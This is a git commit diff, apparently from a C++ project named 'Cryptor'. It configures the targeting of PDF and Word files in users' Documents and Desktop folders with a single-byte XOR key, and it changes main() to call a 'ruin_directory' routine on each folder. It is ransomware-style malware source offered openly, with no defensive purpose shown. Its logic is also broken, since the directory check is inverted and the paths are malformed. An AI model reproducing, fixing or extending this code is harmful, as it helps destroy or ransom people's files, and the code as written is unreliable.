cf4eb97a63ed906b5076c957c935102a91ddae57
Bair <144665069+MshRoom2990@users.noreply.github.com>
2025-10-25 13:37:32 +0900

    Add files via upload

--- headers/config.h
+++ headers/config.h
@@ -4,8 +4,18 @@
 #include <string>
 #include <vector>
 
+/* Define system path spearators - (System Definitions) */
+#if defined(_WIN32) || defined(_WIN64)
+    std::string path_sep = "\\";
+
+#else
+    std::string path_sep = "/";
+
+#endif
+
 /* Program configuration */
 std::vector<std::string> validExtensions = {".pdf", ".doc", ".docx"};
+std::vector<std::string> directories     = {path_sep + "Documents", path_sep + "Desktop"};
 std::string separator                    = "/";
 char key                                 = 0xA2;
 
--- main.cpp
+++ main.cpp
@@ -2,12 +2,31 @@
 //  main.cpp
 //  Cryptor
 //
-//  Created by MshRoom2290 on 10/23/25.
+//  Created by Gleb Bair on 10/23/25.
 //
 
 #include <iostream>
 #include "headers/cryptor.h"
+#include "headers/config.h"
+#include "headers/banners.h"
 
 int main(int argc, const char * argv[]) {
-    return 0;
+    /* 
+    * Try and identify the operating system the user is running. If the
+    * the user runs windows, the file path separator is '\'. Linux and
+    * macOS uses '/'
+    *
+    * 1.) Iterate through list of directories (after definition)
+    * 2.) Are those directories valid?
+    * 3.) RUin directories
+    */
+    for (const std::string& dir : directories) {
+        cryptor::fs::path dir_path(dir);
+
+        if (!cryptor::fs::exists(dir) || cryptor::fs::is_directory(dir)) {
+            banners::print_error({"Invalid directory...", dir}); return 1;
+        }
+
+        cryptor::ruin_directory(dir, key);
+    }
 }
